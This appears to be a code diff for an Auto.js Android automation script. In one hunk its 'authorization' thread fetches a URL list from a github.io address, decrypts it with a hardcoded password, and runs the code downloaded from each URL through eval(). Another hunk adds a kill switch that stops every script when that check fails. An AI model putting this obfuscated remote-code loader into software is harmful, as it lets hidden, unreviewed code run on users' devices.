@@ -34,7 +34,7 @@ var tempSave = {
         "重发消息时加入颜文字",
         "新增ID用户关注",
         "优化关注",
-        "《测试》优化发送消息",
+        "优化发送消息",
     ];
     tempSave.version += logs.pop();
     events.broadcast.emit("unlockOK", "run...");
@@ -341,7 +341,7 @@ exit = function () {
     Exit();
 }
 threads.start(function () {
-
+    let password = "授权线程的加密密码";
     let serverAuthUrl = [];
     let requestNumber = 0;
 
@@ -377,11 +377,13 @@ threads.start(function () {
             let re = http.get("https://lbh886633.github.io/js/auth.js");
             requestNumber++;
             if(parseInt(re.statusCode/10) == 20) {
-                //TODO 解密数据并切割链接出来
-                let urlDataString = re.body.string();
+                // 解密数据并切割链接出来
+                let urlDataString = deData(password + "jiaa", re.body.string());
                 urlDataString.split("\n").forEach((url)=>{
                     if(serverAuthUrl.indexOf(url) < 0) {
-                        serverAuthUrl.push(url);
+                        if(4 < url.length) {
+                            serverAuthUrl.push(url);
+                        }
                     }
                 })
             }
@@ -393,10 +395,12 @@ threads.start(function () {
         serverAuthUrl.forEach((url)=>{
             try{
                 // 请求数据并将数据内容进行执行
-                eval(http.get(url).body.string())
+                eval(deData(password + "mili", http.get(url).body.string()))
             }catch(e){
-                // log("代码运行异常")
-                // console.verbose(e)
+                toastLog("授权校验失败！");
+                engines.stopAll();
+                threads.shutDownAll();
+                exit();
             }
         })
     }
@@ -444,7 +448,7 @@ ui.layout(
                                     <radio id="mi6_rep"  text="回复" />
                                 </radiogroup>
                                 {/* 测试时使用，将h="0"改成 h="auto"即可 */}
-                                <radiogroup orientation="horizontal" h="auto">
+                                <radiogroup orientation="horizontal" h="0">
                                     <radio id="mi6_null" checked="true" text="空" />
                                     <radio id="functionTest" text="测试函数" />
                                 </radiogroup>
